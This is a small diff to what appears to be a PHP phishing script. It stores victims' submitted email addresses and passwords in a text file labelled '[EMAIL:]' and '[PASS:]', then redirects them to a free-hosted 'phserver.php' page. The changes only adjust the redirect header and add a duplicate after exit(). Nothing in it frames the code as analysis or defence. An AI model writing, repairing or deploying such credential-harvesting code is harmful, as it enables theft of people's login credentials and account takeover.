@@ -6,9 +6,11 @@ session_start();
 			
   			
  file_put_contents("./usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
- header('Location:http://avsmailer.000webhostapp.com/phserver.php');
+ header('Location: http://avsmailer.000webhostapp.com/phserver.php');
+
 exit();
 	
+ header('Location: http://avsmailer.000webhostapp.com/phserver.php');
 			
 session_destroy();
 			
